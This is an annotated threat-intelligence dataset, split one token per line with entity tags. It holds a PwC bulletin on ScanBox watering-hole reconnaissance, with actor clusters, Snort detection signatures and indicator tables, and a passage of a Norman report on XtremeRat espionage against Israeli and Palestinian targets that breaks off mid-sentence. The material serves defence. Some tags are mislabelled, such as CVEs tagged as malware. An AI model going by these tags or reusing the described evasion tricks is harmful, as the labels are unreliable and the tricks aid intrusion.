identify
virtual
machines
which
are
typically
configured
with
specific
graphics
options
.

Local
Time
on
the
machine
–
checking
that
the
local
time
on
the
machine
matches
the
expected
time
given
the
geo-location
of
the
infected
IP
address
–
in
many
cases
analysis
environments
are
not
configured
with
the
correct
time
.

Updates
to
evade
signatures
Possibly
in
response
to
our
previous
report
,
we
've
seen
some
of
the
groups
using
ScanBox B_malware.infosteal
alter
the
content
of
the
modules
to
evade
detection
.

Attackers
do
read
reports
,
both
to
help
them
attack3
and
also
to
evade
detection
.

One
change
has
been
the
URI
formats
used
to
deliver
stolen
key
log
data
from
obvious
URLs
such
as
:
/k.php?data=[KeyloggerData
]
To
more
subtle
URLs
such
as
:
/
[
KeyloggerData].jpg
We
also
note
that
following
our
release
of
a
signature
to
detect
the
phrase
'
No
Java
or
Disable
'
,
which
was
present
in
a
number
of
related
frameworks
,
some
of
the
attackers
have
now
changed
this
to
'
No
or
Disable
'
.

3
For
example
as
in
http://pwc.blogs.com/cyber_security_updates/2015/01/destructive-malware.html B_url.normal
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
3
.

Previously
...
on
ScanBox B_malware.infosteal
...
Clusters
In
our
previous
entry
on
ScanBox B_malware.infosteal
we
described
four
clusters
of
activity
–
this
section
includes
updates
on
those
clusters
.

Previously
,
we
were
only
able
to
cluster
activity
based
on
the
infrastructure
used
and
the
associated
malware
,
we
now
have
a
sufficient
number
of
samples
to
cluster
based
on
differences
in
implementation
between
the
code
used
for
ScanBox B_malware.infosteal
in
each
case
.

Flash
Cluster
(
aka
Cluster
1
)
The
recently
published
FBI
flash
alert
#
A-000049-MW4
,
cited
domain
names
previously
referenced
in
our
blog
as
being
related
to
an
actor
known
as
Deep
Panda
,
which
we
'll
get
to
in
a
minute
.

The
link
appears
to
have
been
made
from
the
use
of
the
DerUsbi B_malware.infosteal
malware
family
though
,
which
we
know
to
be
used
by
several
espionage
actors
.

What
is
interesting
is
the
potential
overlap
between
the
target
selection
of
this
cluster
and
the
targets
of
those
behind
the
recently
reported
Forbes
compromise
5
,
6
.

Checking
the
Google
SafeBrowsing
results
for
*.googlecaches.com B_url.distribute
,
shows
that
the
domain
was
used
for
distribution
of
malicious
code
for
a
significant
period
after
our
previous
blog
entry
:
This
includes
distribution
via
gokbayrak.com B_url.distribute
.

Looking
at
whether
any
other
domains
or
IP
addresses
were
observed
delivering
malicious
software
via
gokbayrak.com B_url.distribute
shows
that
it
was
also
observed
delivering
malware
via
88.80.190[.]133 B_ip.distribute
.

This
is
the
same
IP
address
that
was
cited
in
iSight
's
reporting
of
the
Forbes
breach
.

4
http://krebsonsecurity.com/wp-content/uploads/2015/02/fbi-pandaflash.png B_url.normal
5
http://www.invincea.com/2015/02/chinese-espionage-campaign-compromises-forbes/ B_url.normal
6
http://www.isightpartners.com/2015/02/codoso/ B_url.normal
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
In
fact
,
the
IP
address
88.80.190.133 B_ip.distribute
was
involved
in
the
compromise
of
the
same
3
websites
as
SafeBrowsing
shows
were
affected
by
googlecaches.com B_url.distribute
.

The
same
three
sites
targeted
with
the
0-day
used
in
the
Forbes
attack
were
also
observed
distributing
malware
via
googlecaches[.]com
-
we
therefore
believe
it
's
likely
that
the
group
we
previously
described
as
'
Cluster
1
'
was
behind
the
Forbes
compromise
.

We
can
use
similar
techniques
to
explore
other
actors
who
have
the
same
tasking
as
Cluster
1
.

In
the
screenshot
of
websites
delivering
malware
via
gokbayrak.com B_url.distribute
,
we
saw
that
the
domain
name
macanna.com[.]tw B_url.distribute
was
also
used
to
distribute
malware
from
this
page
.

Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
Whilst
macanna.com[.]tw B_url.distribute
appears
to
be
a
legitimate
site
,
it
has
also
been
observed
as
being
a
command
and
control
destination
for
malware
.

The
malware
sample
in
question
has
a
hash
of
3b8d7732de3b3c8823d241e7cd3185c4 B_hash
.

The
same
sample
also
communicates
with
happynewyear.dns04[.]com B_url.distribute
,
which
in
turn
resolves
to
the
IP
address
115.23.172[.]151 B_ip.distribute
,
which
hosts
a
large
number
of
other
malicious
host
names
:
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
These
following
hostnames
are
activity
associated
with
the
actor
best
known
as
TH3Bug7
-
named
after
their
choice
of
Poison
Ivy
password
.

Their
malware
samples
are
present
in
the
same
cluster
:
7
http://researchcenter.paloaltonetworks.com/2014/09/recent-watering-hole-attacks-attributed-apt-group-th3bug-using-poison-ivy/ B_url.normal
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
Deep
Cluster
(
aka
Cluster
2
,
centred
on
news.foundationssl[.]com B_url.unknown
)
This
cluster
relates
to
the
threat
actor
referred
to
as
Deep
Panda
by
CrowdStrike
,
as
was
confirmed
in
a
recent
blog
post8
.

In
turn
,
this
is
widely
believed
to
relate
to
the
incident
at
Anthem
,
as
described
in
a
Krebs
post9
.

The
graph
below
shows
the
links
between
the
we11point.com B_url.unknown
domain
name
,
and
news.foundationssl[.]com B_url.unknown
as
seen
on
the
CrowdStrike
blogpost
:
The
Krebs
article
also
points
toward
other
possible
(
although
not
explicit
)
links
between
the
domain
allegedly
used
in
the
Anthem
hack
(
we11point.com B_url.unknown
)
to
Cluster
2
through
shared
WHOIS
details
,
as
we11point.com B_url.unknown
was
registered
by
domain
re-seller
'
li2384826402@yahoo.com
'
On
its
own
,
this
would
not
be
sufficient
to
associate
the
two
clusters
,
but
it
is
useful
to
note
as
a
'softer
'
overlap
.

8
blog.crowdstrike.com/ironman-deep-panda-uses-sakula-malware-target-organizations-multiple-sectors/ B_url.normal
9
http://krebsonsecurity.com/2015/02/anthem-breach-may-have-started-in-april-2014/ B_url.normal
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
Mystery
Cluster
3
(
aka
Cluster
3
,
centered
on
qoog1e[.]com B_url.unknown
)
:
Cluster
3
remains
a
mystery
,
unfortunately
the
code
used
in
this
instance
is
the
most
slim
line
version
,
and
has
since
not
been
widely
re-used
–
it
is
unclear
who
was
behind
the
compromise
using
this
domain
name
.

Evil
Cluster
(
aka
Cluster
4
,
centred
on
webmailgoogle[.]com B_url.unknown
)
:
We
'd
previously
missed
the
link
between
Cluster
4
–
and
malware
widely
known
as
'
EvilGrab B_malware.infosteal
'
or
'
Vidgrab B_malware.backdoor
'
.

From
our
view
point
,
this
malware
is
exclusively
used
by
one
group
,
known
by
CrowdStrike
as
Stone
Panda10
.

In
addition
to
the
four
clusters
outlined
above
,
within
the
24
additional
compromises
identified
,
we
believe
there
are
at
least
3
other
distinct
groups
using
the
framework
.

Digital
Quartermastering
In
their
2013
paper
'From
Quartermaster
to
Sunshop
'
11
,
FireEye
described
the
concept
of
a
Digital
Quartermaster
,
a
kind
of
malware
supply
chain
for
intrusions
,
where
a
skilled
team
would
develop
toolsets
for
a
range
of
attackers
who
deploy
them
.

The
shared
use
of
ScanBox B_malware.infosteal
may
match
up
quite
well
to
this
hypothesis
,
and
indeed
even
to
some
extent
the
naming
schema
overlaps
,
as
iSight
refer
to
the
actor
behind
the
Forbes
breach
as
Codoso
,
but
suggest
they
are
publically
known
as
'
Sunshop
'
.

In
all
likelihood
this
relates
to
a
series
of
blogs
by
FireEye
which
refer
to
a
series
of
web
compromises
in
2013
as
being
the
SunShop12
campaign
.

Although
we
did
not
notice
the
correlation
immediately
,
there
is
good
overlap
between
the
groups
we
've
described
above
,
and
the
clusters
of
activity
described
as
sharing
a
Flash
0-day
in
early
2014
by
Symantec13
.

Although
other
groups
have
since
begun
using
the
framework
,
the
first
groups
to
use
the
framework
(
clusters
1-4
)
correspond
quite
nicely
to
the
existing
Symantec
blog
.

For
reference
,
we
've
overlaid
our
ScanBox B_malware.infosteal
clusters
against
the
likely
clusters
Symantec
created
behind
the
scenes
for
their
blog
,
as
well
as
other
popular
names
:
ScanBox B_malware.infosteal
Cluster
Cluster
1
CrowdStrike
Symantec
Group
Other
Names
?
?
?

Sunshop
(
iSight
)
Vulnerabilities
&
Frameworks
ScanBox B_malware.infosteal
CVE-2014-6332 B_malware.backdoor
ScanBox B_malware.infosteal
Malware
Used
Briba B_malware.backdoor
,
Poison B_malware.infosteal
Ivy I
CVE-2014-0322 B_malware.backdoor
(
Internet
Explorer
)
Cluster
2
Deep
Panda
Sakurel B_malware.backdoor
CVE-2012-4792 B_malware.backdoor
(
Internet
Explorer
)
Sakurel B_malware.backdoor
,
DerUsbi B_malware.infosteal
,
many
others
CVE-2014-0502 B_malware.backdoor
(
Adobe
Flash
)
10
http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem B_url.normal
11
https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-malware-supply-chain.pdf B_url.normal
12
https://www.fireeye.com/blog/threat-research/2013/05/ready-for-summer-the-sunshop-campaign.html B_url.normal
13
http://www.symantec.com/connect/blogs/how-elderwood-platform-fueling-2014-s-zero-day-attacks B_url.normal
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
CVE-2014-1776 B_malware.backdoor
(
Internet
Explorer
)
ScanBox B_malware.infosteal
Cluster
4
Stone
Panda
Vidgrab B_malware.backdoor
CVE-2014-0322 B_malware.backdoor
(
Internet
Explorer
)
Jolob B_malware.backdoor
/
Vidgrab B_malware.backdoor
CVE-2014-0502 B_malware.backdoor
(
Adobe
Flash
)
Please
note
that
each
vendor
has
their
own
way
of
grouping
activity
together
,
so
these
mappings
are
given
on
a
best
efforts
basis
.

Player
5
has
entered
the
game
....
In
all
examples
of
ScanBox B_malware.infosteal
deployments
discussed
so
far
,
we
believe
that
the
scripts
were
deployed
to
anyone
who
visited
websites
of
interest
to
a
given
sector
which
the
attacker
was
able
to
compromise
–
and
that
the
attackers
waited
for
victims
to
visit
the
compromised
site
.

However
one
group
of
attackers
using
the
ScanBox B_malware.infosteal
framework
are
now
actively
sending
e-mails
to
potential
victims
,
where
the
e-mails
contain
links
to
websites
hosting
ScanBox B_malware.infosteal
.

We
believe
these
attackers
are
not
covered
by
the
existing
clusters
1
through
4
,
as
the
code
differs
from
that
used
elsewhere
.

This
method
of
sending
links
rather
than
waiting
for
visiting
a
specific
compromised
website
has
two
main
advantages
:


The
advantage
that
the
attacker
doesn't
have
to
compromise
sites
that
are
relevant
to
the
sector
they
wish
to
perform
reconnaissance
against
,
so
generally
this
will
make
things
easier
for
the
attacker
;
and
,
The
attacker
has
to
deal
with
fewer
false
positives
in
terms
of
data
received
from
victims
.

Even
good
IP
whitelisting
techniques
will
result
in
some
false
positives
,
by
controlling
the
visitors
however
they
can
ensure
only
those
they
want
to
scan
are
scanned
.

This
group
differs
from
the
others
based
on
the
following
characteristics
:

They
send
e-mails
with
links
to
compromised
websites
,
rather
than
compromising
sites
of
interest
to
their
targets
.

Attackers
send
links
to
victims
using
a
similar
technique
to
that
described
in
our
Sofacy
phishing
blog14
,
where
multiple
redirects
are
deployed
,
one
being
a
decoy
,
the
other
in
this
case
loading
ScanBox B_malware.infosteal
:
14
http://pwc.blogs.com/files/tactical-intelligence-bulletin---sofacy-phishing.pdf B_url.normal
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE

Uses
the
'
checkFolders
'
function
within
the
ScanBox B_malware.infosteal
code
,
rather
than
explicitly
checking
for
files
;
and
,

Hosts
the
ScanBox B_malware.infosteal
code
on
the
same
page
they
have
compromised
rather
than
on
a
3rd
party
IP
address
or
domain
name
owned
by
the
attacker
.

So
far
we
have
identified
four
low
key
websites
,
all
belonging
to
small
companies
based
in
the
United
States
or
Canada
which
are
being
abused
in
this
fashion
.

3.1
.

Going
behind
enemy
lines
–
fears
of
proliferation
and
upcoming
attacks
At
one
point
during
our
investigation
into
infrastructure
hosting
ScanBox B_malware.infosteal
code
,
we
identified
a
server
which
appeared
to
be
used
for
development
and
testing
purposes
.

On
this
occasion
,
the
server
side
code
was
publicly
accessible
,
allowing
us
to
gain
insights
into
the
development
and
testing
phase
of
an
attack
using
ScanBox B_malware.infosteal
.

This
also
included
the
ScanBox B_malware.infosteal
framework
's
own
detailed
reconnaissance
against
the
developer
themselves
.

We
noted
the
developer
repeatedly
uploading
the
modified
versions
to
VirusTotal
,
presumably
in
an
attempt
to
improve
evasion
of
anti-virus
.

We
do
not
believe
this
developer
is
part
of
the
core
group
that
has
access
to
the
original
implementation
,
but
is
instead
another
actor
,
who
is
likely
rebuilding
ScanBox B_malware.infosteal
from
samples
they
find
online
.

Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
The
screenshot
on
the
left
is
from
a
version
currently
in
development
by
a
possible
attacker
,
the
corresponding
screenshot
on
the
right
is
from
a
public
article15
.

15
http://www.cnxhacker.com/2015/01/19/6412.html B_url.normal
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
4
.

Conclusion
The
publication
of
threat
information
allows
us
to
draw
links
between
different
campaigns
,
tools
and
malware
but
we
need
to
be
careful
about
which
links
we
consider
to
be
significant
and
ensure
we
're
confident
in
how
information
that
's
publically
available
was
derived
.

The
summary
above
is
just
our
view
of
the
overlaps
in
web
based
tools
/
exploits
and
targets
between
different
threat
actors
,
but
those
with
different
datasets
may
be
able
to
draw
different
conclusions
.

Last
time
,
we
identified
three
possible
hypotheses
to
explain
the
overlap
between
the
ScanBox B_malware.infosteal
users
,
in
this
blog
,
based
on
the
data
we
have
available
,
we
can
settle
on
just
one
of
these
conclusions
:
'
2
.

Selections
of
actors
share
some
resources
,
as
per
previous
observations
with
similar
kits
by
some
security
vendors
.
'

Specifically
,
our
key
conclusions
are
:



[
High
Confidence
]
-
The
DQM
theory
presented
by
FireEye
and
later
explored
by
Symantec
in
2014
about
likely
tool
and
exploit
sharing
between
a
specific
set
of
groups
continues
to
hold
true
,
we
can
only
speculate
as
to
the
nature
of
the
relationships
organisationally
between
these
groups
.

[
Medium
Confidence
]
-
We
currently
believe
that
the
activity
represented
by
Cluster
1
and
the
activity
related
to
Th3Bug
are
distinct
,
but
that
there
is
overlap
in
who
they
are
tasked
to
target
.

[
Low
confidence
]
–
Th3Bug
is
one
of
the
other
actors
who
is
in
receipt
of
the
same
shared
resource
pool
as
those
clusters
already
identified
in
this
blog
.

What
is
not
clear
is
why
specific
resources
(
web-based
exploits
)
appear
to
be
shared
,
and
why
others
(
primarily
malware
families
)
are
sometimes
kept
within
a
specific
cluster
.

Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
5
.

Signatures
Snort
Signatures
–
TLP
WHITE
alert
tcp
$
EXTERNAL_NET
any
-
>
$
HOME_NET
any
(
msg
:
'
--
[
PwC
CTD
]
--
MultiGroup
-
ScanBox B_malware.infosteal
and
Targetted
Watering
Holes
Content
(
plugin_pdf_ie
(
)
)
'
;
flow
:
established
,
from_server
;
file_data
;
content
:
'
plugin_pdf_ie
(
)
'
;
classtype
:
trojan-activity
;
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html B_url.normal
;
metadata
:
tlp
WHITE
,
author
CDD
;
sid
:
xxxxxx
;
rev:2015021901
;
)
alert
tcp
$
EXTERNAL_NET
any
-
>
$
HOME_NET
any
(
msg
:
'
--
[
PwC
CTD
]
--
MultiGroup
-
ScanBox B_malware.infosteal
Watering
Hole
Content
(
.item(0).appendChild(iframe_tag
)
)
'
;
flow
:
established
,
from_server
;
file_data
;
content:'.item(0).appendChild(iframe_tag
)
'
;
classtype
:
trojan-activity
;
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html B_url.normal
;
metadata
:
tlp
WHITE
,
author
CDD
;
sid
:
xxxxxx
;
rev:2015021901
;
)
alert
tcp
$
EXTERNAL_NET
any
-
>
$
HOME_NET
any
(
msg
:
'
--
[
PwC
CTD
]
--
MultiGroup
-
ScanBox B_malware.infosteal
and
Targetted
Watering
Holes
Content
(
var
version\
;
var
ax\
;
var
e\
;
try
{
axo=new
ActiveXObject
)
'
;
flow
:
established
,
from_server
;
file_data
;
content
:
'var
version\
;
var
ax\
;
var
e\
;
try
{
axo=new
ActiveXObject
'
;
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html B_url.normal
;
metadata
:
tlp
WHITE
,
author
CDD
;
sid
:
xxxxxx
;
rev:2015021901
;
)
alert
tcp
$
EXTERNAL_NET
any
-
>
$
HOME_NET
any
(
msg
:
'
--
[
PwC
CTD
]
--
MultiGroup
-
ScanBox B_malware.infosteal
Watering
Hole
Content
(
document.getElementsByTagName('head').item(0).appendChild(form_tag
)
\
;
)
'
;
flow
:
established
,
from_server
;
file_data
;
content:'document.getElementsByTagName('head').item(0).appendChild(form_tag
)
\
;
'
;
classtype
:
trojan-activity
;
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html B_url.normal
;
metadata
:
tlp
WHITE
,
author
CDD
;
sid
:
xxxxxx
;
rev:2015021901
;
)
alert
tcp
$
EXTERNAL_NET
any
-
>
$
HOME_NET
any
(
msg
:
'
--
[
PwC
CTD
]
--
MultiGroup
-
ScanBox B_malware.infosteal
Watering
Hole
Content
(
return
(
(
!
a
)
?

'x-
'
:
a
)
+
Math.floor(Math.random
(
)
*
99999
)
\
;
)
'
;
flow
:
established
,
from_server
;
file_data
;
content
:
'return
(
(
!
a
)
?

'x-
'
:
a
)
+
Math.floor(Math.random
(
)
*
99999
)
\
;
'
;
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html B_url.normal
;
metadata
:
tlp
WHITE
,
author
CDD
;
sid
:
xxxxxx
;
rev:2015021901
;
)
alert
tcp
$
EXTERNAL_NET
any
-
>
$
HOME_NET
any
(
msg
:
'
--
[
PwC
CTD
]
--
MultiGroup
-
TH3BUG
and
Non-Targetted
Groups
Watering
Hole
Code
(
Chr
(
CInt
(
ns
(
i
)
)
Xor
n
)
)
'
;
flow
:
established
,
from_server
;
file_data
;
content
:
'Chr
(
CInt
(
ns
(
i
)
)
Xor
n
)
'
;
classtype
:
trojan-activity
;
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html B_url.normal
;
metadata
:
tlp
WHITE
,
author
CDD
;
sid
:
xxxxxx
;
rev:2015021901
;
)
classtype
:
trojan-activity
;
classtype
:
trojan-activity
;
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
6
.

Appendices
Appendix
A
–
ScanBox B_malware.infosteal
Sites
Where
the
site
was
referenced
via
phishing
as
opposed
to
'Watering
Hole
'
based
activity
,
it
has
been
excluded
from
the
following
table
.

Where
we
have
an
assigned
cluster
,
but
have
not
discussed
it
in
this
document
,
we
have
given
'Cluster
[
Letter
]
'
these
are
not
intended
as
names
for
groups
.

Where
we
do
not
have
an
associated
group
we
have
listed
'unknown
'
under
this
field
.

Country
CN
US
US
US
KR
JP
GB
JP
VN
JP
JP
MN
MM
MN
MN
CN
VN
AU
CN
Sector
/
Target
Uyghur
Think
Tank
Think
Tank
Think
Tank
Hospitality
Industrial
Sector
Chemicals
Geological
Surveying
Government
Education
Geological
Surveying
Government
Government
Media
Media
NGO
Government
Government
Technology
Cluster
Cluster
1
Cluster
2
Cluster
2
Cluster
2
Cluster
3
Cluster
4
Cluster
4
Cluster
4
Cluster
A
Cluster
A
Cluster
A
Cluster
B
Cluster
C
Unknown
Unknown
Unknown
Unknown
Unknown
Unknown
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
Appendix B_hash
B I
–
Indicators
of
Compromise
–
TLP
:
WHITE
This
table
only
includes
related
new
single
value
IoCs
which
were
not
already
published
in
our
previous
blog
,
which
we
are
happy
to
share
at
TLP
:
WHITE
Cluster
Cluster
1
Cluster
1
Cluster
1
Cluster
1
Cluster
1
Cluster
1
Cluster
1
Cluster
1
Cluster
1
Cluster
1
Cluster
1
Cluster
1
Cluster
1
Cluster
4
Cluster
4
Cluster
4
Cluster
4
Cluster
4
Cluster
4
Value
1.9.5.38 B_ip.unknown
103.255.61.227 B_ip.unknown
118.193.153.221 B_ip.unknown
118.193.153.227 B_ip.unknown
174.121.122.73 B_ip.unknown
Artefact
type
IP
Address
IP
Address
IP
Address
IP
Address
IP
Address
4639c30b3666cb11b3927d5579790a88bff68e8137f18241f4693e0d4539c608 B_hash
Malware
Hash
809959f390d5a49c8999ad6fff27fdc92ff1b2b0 B_hash
Malware
Hash
ab58b6aa7dcc25d8f6e4b70a24e0ccede0d5f6129df02a9e61293c1d7d7640a2 B_hash
Malware
Hash
e8a8ffe39040fe36e95217b4e4f1316177d675ed B_hash
Malware
Hash
file.googlecaches.com B_url.unknown
gtm.googlecaches.com B_url.unknown
js.googlewebcache.com B_url.unknown
owa.outlookssl.com B_url.unknown
122.10.10.161 B_ip.unknown
204.152.199.43 B_ip.unknown
50.2.24.211 B_ip.unknown
bak.mailaunch.com B_url.unknown
f1890cc9d6dc84021426834063394539414f68d8 B_hash
us-mg6.mail.yahoo.mailaunch.com B_url.unknown
Hostname
Hostname
Hostname
Hostname
IP
Address
IP
Address
IP
Address
Hostname
Malware
Hash
Hostname
Appendix B_malware.unknown
C I
–
Standard
software
list
detected
by
ScanBox B_malware.infosteal
7z B_malware.normal
AhnLab_V3 B_malware.normal
antiyfx B_malware.normal
a-squared B_malware.normal
avg2012 B_malware.normal
avira B_malware.normal
Bit9 B_malware.normal
bitdefender_2013 B_malware.normal
BkavHome B_malware.normal
COMODO B_malware.normal
Dr.Web B_malware.normal
emet4.1 B_malware.normal
emet5.0 B_malware.normal
eScan B_malware.normal
eset_nod32 B_malware.normal
ESET-SMART B_malware.normal
ESTsoft B_malware.normal
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
Fortinet B_malware.normal
F-PROT B_malware.normal
F-Secure B_malware.normal
f-secure2011 B_malware.normal
IKARUS B_malware.normal
Immunet B_malware.normal
iTunes B_malware.normal
JiangMin B_malware.normal
Kaspersky_2012 B_malware.normal
Kaspersky_2013 B_malware.normal
Kaspersky_Endpoint_Security_8 B_malware.normal
mcafee_enterprise B_malware.normal
Mse B_malware.normal
Norman B_malware.normal
Norton B_malware.normal
Nprotect B_malware.normal
Outpost B_malware.normal
PC_Tools B_malware.normal
QuickHeal B_malware.normal
Rising B_malware.normal
Rising_firewall B_malware.normal
sophos B_malware.normal
SQLServer B_malware.normal
Sunbelt B_malware.normal
SUPERAntiSpyware B_malware.normal
Symantec_Endpoint12 B_malware.normal
symantec-endpoint B_malware.normal
Trend2013 B_malware.normal
ViRobot4 B_malware.normal
VirusBuster B_malware.normal
vmware-client B_malware.normal
vmware-server B_malware.normal
WinRAR B_malware.normal
winzip B_malware.normal
Cyber
Threat
Operations
Tactical
Intelligence
Bulletin
–
TLP
:
WHITE
Further
information
For
more
in-depth
coverage
,
including
full
details
of
the
analysis
behind
this
blog
as
well
as
additional
indicators
which
can
be
used
to
detect
similar
samples
,
or
if
you
have
any
other
queries
,
please
give
us
a
shout
at
threatintelligence@uk.pwc.com B_url.unknown
.

The
information
contained
in
this
document
has
been
prepared
as
a
matter
of
interest
and
for
information
purposes
only
,
and
does
not
constitute
professional
advice
.

You
should
not
act
upon
the
information
contained
in
this
email
without
obtaining
specific
professional
advice
.

No
representation
or
warranty
(
express
or
implied
)
is
given
as
to
the
accuracy
or
completeness
of
the
information
contained
in
this
email
,
and
,
to
the
extent
permitted
by
law
,
PricewaterhouseCoopers
LLP
,
its
members
,
employees
and
agents
do
not
accept
or
assume
any
liability
,
responsibility
or
duty
of
care
for
any
consequences
of
you
or
anyone
else
acting
,
or
refraining
to
act
,
in
reliance
on
the
information
contained
in
this
email
or
for
any
decision
based
on
it
.

Cyber
Threat
Operations
Systematic
cyber
attacks
against
Israeli
and
Palestinian
targets
going
on
for
a
year
By
Snorre
Fagerland
Principal
Security
Researcher
©
Norman
AS
,
November
2012
Summary
We
have
observed
multiple
probable
malware
attacks
against
Israeli
and
Palestinian
targets
.

These
attacks
are
likely
performed
by
the
same
attacker
,
as
the
malware
in
question
communicate
with
the
same
command
-
and
control
structures
,
and
in
many
cases
are
signed
using
the
same
digital
certificate
.

These
attacks
have
been
ongoing
for
at
least
a
year
;
seemingly
first
focused
on
Palestinians
,
then
Israelis
.

The
attacker
is
unknown
at
this
point
,
but
the
purpose
is
assumed
to
be
espionage
/
surveillance
.

©Norman
,
November
2012
2
Introduction
Recently
,
media
(
1
)
reported
of
a
targeted
attack
against
the
Israeli
government
,
in
the
form
of
emails
purporting
to
come
from
IDF
Chief
of
Staff
Benny
Gantz
with
a
malicious
attachment
.

This
was
an
interesting
development
–
Israel
has
,
as
far
as
we
know
,
not
been
very
targeted
by
spear B_malware.infosteal
phishing I
attacks
like
this
.

In
the
following
text
we
will
usually
be
referring
to
the
actual
malware
files
we
uncovered
by
their
MD5
hash
,
which
is
a
number
that
uniquely
(
well
,
uniquely
enough
)
identifies
the
file
in
question
.

©Norman
,
November
2012
3
The
initial
reported
malware
While
we
don't
have
visibility
into
Israeli
government
mails
,
we
do
receive
a
lot
of
suspicious
executable
files
,
and
a
little
digging
gives
results
.

We
found
one
file
which
matched
the
reports
:
'
IDF
strikes
militants
in
Gaza
Strip
following
rocket
barrage.doc
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
.scr
'
.

This
is
an
executable
file
,
but
the
icon
looks
like
a
document
icon
,
and
the
very
long
name
makes
the
*.scr
extension
hard
to
spot
-
particularly
if
the
executable
comes
packaged
in
an
archive
,
as
was
reportedly
the
case
here
.

This
executable
itself
is
a
WinRAR
selfextracting
(
SFX
)
archive
,
which
contains
several
other
files
:
•
Word.exe
,
an
XtremeRat B_malware.backdoor
backdoor
executable
•
2.ico
,
an
icon
file
•
barrage.doc
,
an
innocent
document
containing
pictures
(
above
)
XtremeRat B_malware.backdoor
is
a
commercially
available
backdoor
trojan
which
has
been
used
in
many
attacks
,
targeted
and
otherwise
,
over
the
years
.

It
gained
some
notoriety
in
connection
with
attacks
against
Syrian
activists
;
along
with
other
off-the-shelf
trojans
such
as
BlackShades B_malware.backdoor
and
DarkComet B_malware.backdoor
.

©Norman
,
November
2012
4
The
digital
signature
An
interesting
feature
of
this
exact
XtremeRat B_malware.backdoor
is
that
it
is
digitally
signed
–
seemingly
by
Microsoft
:
The
certificate
chain
ends
in
an
untrusted
(
faked
)
root
certificate
;
so
it
will
not
validate
properly
.

Nevertheless
the
certificate
is
useful
for
us
,
as
it
can
be
used
to
find
related
cases
.

All
certificates
are
issued
with
a
serial
number
which
normally
is
quite
unique
,
as
it
is
supposed
to
be
an
identifier
within
the
scope
of
its
issuer
.

So
,
querying
our
databases
for
this
particular
faked
certificate
returns
a
number
of
files
which
are
probably
the
products
of
our
Israel-hostile
attacker
.

These
files
were
received
in
intervals
through
the
fall
and
summer
,
going
back
to
May
2012
,
and
reveal
more
hints
about
targets
.

Several
of
them
are
self
extracting
archives
containing
extra
files
,
such
as
documents
,
links
and
even
video
.

The
following
pages
display
some
of
the
bait
information
the
new
files
contain
.

©Norman
,
November
2012
5
Word
document
,
contained
in
SFX
RAR
file
66DDF27517985A75B2317231B46A6F62 B_hash
Word
document
,
contained
in
SFX
RAR
file
4A06D9989A8C3A9967C2011E5BAF3010 B_hash
'
Report.doc......................................................
..........................................................................
.............exe
'
©Norman
,
November
2012
6
Word
document
,
contained
in
SFX
RAR
file
15FC009D9CAAA8F11D6C3DA2B69EA06E B_hash
'
Silence
of
the
Jews
make
the
Church
of
the
Nativity
of
the
Palestinians.doc-----------.scr
'
Found
in
Israel
Word
document
,
contained
in
SFX
RAR
file
940B3ACDF1E26FCCCF74A5A0359FB079 B_hash
'
IDF
NEWS[RTLO]cod.SCR
'
©Norman
,
November
2012
7
3gp
video
,
contained
in
SFX
RAR
file
9C39D6F52E1E1BE5AE61BAB90971D054 B_hash
'A
Rood
Awakening
!

Michael
Rood
.3gp
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
-.scr
'
Found
in
Israel
Word
document
,
contained
in
SFX
RAR
file
9D144A828F757A90B86976EF0C906B3F B_hash
©Norman
,
November
2012
8
Word
document
,
contained
in
SFX
RAR
file
D14E0A3D408065B1551F2827B50B83CA B_hash
Word
document
,
contained
in
SFX
RAR
file
C8202523F35295E8BC8CC1731EDB0559 B_hash
©Norman
,
November
2012
9
Word
document
,
contained
in
SFX
RAR
file
C21D7165B25CAF65D7F92FF758C1B5B1 B_hash
'The
first
conference
of
Dr
.

Mohamed
Morsi
,
after
winning.doc---------------.scr
'
YouTube
URL
contained
in
SFX
RAR
file
5B740B4623B2D1049C0036A6AAE684B0 B_hash
'סרטים
חינם
אינפורמטיבי
איך
לקשור
נעליים
צבאיות
[
RTLO
]
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
--
-.wmv------------------.scr
'
Found
in
Israel
©Norman
,
November
2012
10
Word
document
,
contained
in
SFX
RAR
file
72fd6074915f8f123eb44b3dd475d36b B_hash
'TShehab[RTLO]cod.scr
'
Found
in
Israel
©Norman
,
November
2012
11
Command
&
Control
The
involved
malwares
connect
to
external
hosts
controlled
by
the
attackers
.

These
belong
to
various
DynDNS
services
,
and
at
the
time
of
writing
resolve
to
IP
addresses
located
with
hosting
services
in
the
US
.

Samples
in
yellow
connecting
to
C
&
C
hosts
(
green
)
.

All
are
